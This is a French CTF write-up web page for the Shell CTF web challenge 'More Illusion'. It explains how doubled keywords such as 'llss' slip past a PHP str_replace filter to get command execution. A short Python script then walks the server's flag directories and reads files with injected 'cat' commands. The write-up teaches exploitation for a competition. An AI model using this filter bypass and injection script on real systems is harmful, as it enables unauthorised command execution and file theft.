<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="Numb3rsProprety">
<meta name="description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&amp;gt; 495 Difficulty: Hard Solves: 75 Description
Challenge link : http://20.125.142.38:8499/
If you still not illuded, here is another potion of illusion for you. Can you survive it ?????
You can du it &amp;hellip;&amp;hellip;..
Note
Je n&amp;rsquo;ai pas mis toute la description du challenge par ce que elle fait un bras mais en gros le flag final est la concatenation du flag &#43; la commande utilisé pour trouver le flag." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://subuthax.github.io/writeup/shell-ctf-more-illusion-/" />


    <title>
        
            Shell CTF: More Illusion :: Subuthax  — A CTF TEAM
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="Shell CTF: More Illusion">
<meta itemprop="description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&gt; 495 Difficulty: Hard Solves: 75 Description
Challenge link : http://20.125.142.38:8499/
If you still not illuded, here is another potion of illusion for you. Can you survive it ?????
You can du it &hellip;&hellip;..
Note
Je n&rsquo;ai pas mis toute la description du challenge par ce que elle fait un bras mais en gros le flag final est la concatenation du flag &#43; la commande utilisé pour trouver le flag."><meta itemprop="datePublished" content="2022-08-14T18:59:02+02:00" />
<meta itemprop="dateModified" content="2022-08-14T18:59:02+02:00" />
<meta itemprop="wordCount" content="512"><meta itemprop="image" content="https://subuthax.github.io/"/>
<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://subuthax.github.io/"/>

<meta name="twitter:title" content="Shell CTF: More Illusion"/>
<meta name="twitter:description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&gt; 495 Difficulty: Hard Solves: 75 Description
Challenge link : http://20.125.142.38:8499/
If you still not illuded, here is another potion of illusion for you. Can you survive it ?????
You can du it &hellip;&hellip;..
Note
Je n&rsquo;ai pas mis toute la description du challenge par ce que elle fait un bras mais en gros le flag final est la concatenation du flag &#43; la commande utilisé pour trouver le flag."/>



    <meta property="og:title" content="Shell CTF: More Illusion" />
<meta property="og:description" content="Auteur du write-up: Numb3rsProprety Category: Web Points: 500 =&gt; 495 Difficulty: Hard Solves: 75 Description
Challenge link : http://20.125.142.38:8499/
If you still not illuded, here is another potion of illusion for you. Can you survive it ?????
You can du it &hellip;&hellip;..
Note
Je n&rsquo;ai pas mis toute la description du challenge par ce que elle fait un bras mais en gros le flag final est la concatenation du flag &#43; la commande utilisé pour trouver le flag." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://subuthax.github.io/writeup/shell-ctf-more-illusion-/" /><meta property="og:image" content="https://subuthax.github.io/"/><meta property="article:section" content="writeup" />
<meta property="article:published_time" content="2022-08-14T18:59:02+02:00" />
<meta property="article:modified_time" content="2022-08-14T18:59:02+02:00" /><meta property="og:site_name" content="Subuthax" />







    <meta property="article:published_time" content="2022-08-14 18:59:02 &#43;0200 CEST" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text">subuthax</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/writeup">Write-Up</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://subuthax.github.io/writeup/shell-ctf-more-illusion-/">Shell CTF: More Illusion</a></h2>

            
            
            

            <div class="post-content">
                <ul>
<li>Auteur du write-up: Numb3rsProprety</li>
<li>Category: <code>Web</code></li>
<li>Points: <code>500</code> =&gt; <code>495</code></li>
<li>Difficulty: Hard</li>
<li>Solves: <code>75</code></li>
</ul>
<p><strong>Description</strong></p>
<blockquote>
<p>Challenge link : http://20.125.142.38:8499/</p>
</blockquote>
<blockquote>
<p>If you still not illuded, here is another potion of illusion for you. Can you survive it ?????</p>
<p>You can du it &hellip;&hellip;..</p>
</blockquote>
<p><strong>Note</strong></p>
<ul>
<li>Je n&rsquo;ai pas mis toute la description du challenge par ce que elle fait un bras mais en gros le flag final est
la concatenation du flag + la commande utilisé pour trouver le flag.</li>
</ul>
<h3 id="introduction">Introduction</h3>
<p><strong>Overview</strong></p>
<p>Le site est exactement le même que pour Illusion:</p>
<ul>
<li>On peut entrer du texte qui sera reflect (où non) sous forme de &ldquo;What I See ◔_◔ <code>truc entré</code>&rdquo;</li>
</ul>
<p>On sais que c&rsquo;est une rce par ce que c&rsquo;est plus ou moins sous-entendu dans la description donc pif je retente un des
payload de illusion (à savoir <code>llss</code>) et badabim badaboum j&rsquo;ai le directory listing. Donc la vous vous dîtes</p>
<p>&ldquo;mais what qu&rsquo;est ce que c&rsquo;est que ce truc pourquoi est ce que il met llss et la pouf un directory listing ??&rdquo;</p>
<p>Ben enfait c&rsquo;est tout con c&rsquo;est par ce que le user input est sanitize par la fonction str_replace qui va check si votre input contient un mot interdit.
Pour illustrer mon propos je vais vous montrer quelque exemples:</p>
<p>Imaginons que le serveur filtre le mot chat avec str_replace(&ldquo;chat&rdquo;, &ldquo;&rdquo;, $input) à chaque occurence de <code>chat</code> dans la var $input le serveur va la
remplacer par du vide. Donc enfait si j&rsquo;input <code>cchathat</code> le serveur va voir uniquement une occurence du mot chat et va l&rsquo;enlever mais ducoup
il restera les autres lettres qui formeront <code>chat</code> a leur tour et la pof nous on a gagné.</p>
<p>Je trifouille dans le serveur à coup de <code>llss ..</code> et la je me retrouve avec un truc affreux:</p>
<p><img src="/tropdechose.png" alt="image alt text"></p>
<p>Dans chaque dossier flag il y a 6 sous dossier flag avec a la fin un fichier flag.txt qui contiennent pour la plupart (en
tout cas ceux que j&rsquo;ai vu) des fake flag
et que les fichier flag vont jusqu&rsquo;à 20 <code>-</code> donc vu je suis un gros flemmard j&rsquo;automatise les recherches.</p>
<p><strong>Exploit</strong></p>
<p>import requests</p>
<p>url = &ldquo;http://20.125.142.38:8499/wH4t_Y0u_d1d?Th1nK_Tw1c3=&rdquo;</p>
<p>symbol = &ldquo;-&rdquo;</p>
<p>base_data = &ldquo;../flag&rdquo;</p>
<p>for i in range(21):</p>
<pre><code>url_temp1 = url + f&quot;llss  {base_data}&quot; + symbol * i

for x in range(7):

    url_temp2 = url_temp1 + &quot;/&quot; + &quot;flag/&quot; * x

    bisous  = requests.get(url_temp2)

    if &quot;flag.txt&quot; in bisous.text:

        print(&quot;[+] Flag trouvé à: &quot; + url_temp2)

        url_temp3 = url_temp2.replace(&quot;llss&quot;, &quot;cat&quot;)

        url_temp3 += &quot;flag.txt&quot;

        flag_stp = requests.get(url_temp3)

        print(f&quot;[+]Trying {url_temp3}&quot;)

        if &quot;N0t_7h1s_345y&quot; not in flag_stp.text:

            print(flag_stp.text)
</code></pre>
<p>Mon script est d&rsquo;une débilité sans nom il va juste itérer sur 20  tirets et sur 6 subdir flag en faisant des requêtes et en checkant l&rsquo;output du fichier flag.txt
pour verifier si le contenu est différent de N0t_7h1s_345y. Je finis par avoir un <code>H0p3_4ny0N3_No7_n071c3_SiZe_D1fF3reNc3</code> qui pop et puis
la je crie victoire mais retour a la réalité: le chall n&rsquo;est pas fini. Comme j&rsquo;ai fait le chall comme un gros bourrin je n&rsquo;ai pas utiliser la commande
voulu à savoir <code>du apparent-size ah</code> (big up a B.A.Seven)</p>
<p>Ce qui nous donne <code>shellctf{H0p3_4ny0N3_No7_n071c3_SiZe_D1fF3reNc3_du_apparent-size_ah}</code></p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.feebdc8d801e3fb1791305e362b6d11557f029604dd5b3c27e2686bc88787ee90ae1ccf0afe81bd7d959d7617cfe1fc73062aa82b4e1fa830d6941193d2cbddf.js" integrity="sha512-/uvcjYAeP7F5EwXjYrbRFVfwKWBN1bPCfiaGvIh4fukK4czwr&#43;gb19lZ12F8/h/HMGKqgrTh&#43;oMNaUEZPSy93w=="></script>



    </body>
</html>
